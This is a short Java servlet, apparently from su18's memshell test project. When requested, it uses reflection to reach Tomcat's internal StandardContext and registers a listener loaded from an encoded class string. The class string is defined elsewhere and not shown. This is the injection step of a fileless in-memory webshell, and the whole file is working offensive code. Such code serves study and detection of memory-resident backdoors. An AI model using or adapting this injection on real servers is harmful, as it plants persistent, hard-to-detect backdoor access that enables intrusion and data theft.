package org.su18.memshell.test.tomcat;

import org.apache.catalina.core.StandardContext;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;

import static org.su18.memshell.test.tomcat.DynamicUtils.LISTENER_CLASS_STRING;

/**
 * 访问这个 Servlet 将会动态添加自定义 Listener
 * 测试版本 Tomcat 8.5.31
 *
 * @author su18
 */
public class AddTomcatListener extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

		ServletContext servletContext = req.getServletContext();

		StandardContext o = null;

		try {

			// 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
			while (o == null) {
				Field f = servletContext.getClass().getDeclaredField("context");
				f.setAccessible(true);
				Object object = f.get(servletContext);

				if (object instanceof ServletContext) {
					servletContext = (ServletContext) object;
				} else if (object instanceof StandardContext) {
					o = (StandardContext) object;
				}
			}

			// 添加监听器
			o.addApplicationEventListener(DynamicUtils.getClass(LISTENER_CLASS_STRING).newInstance());

			resp.getWriter().println("tomcat listener added");

		} catch (Exception e) {
			e.printStackTrace();
		}

	}
}
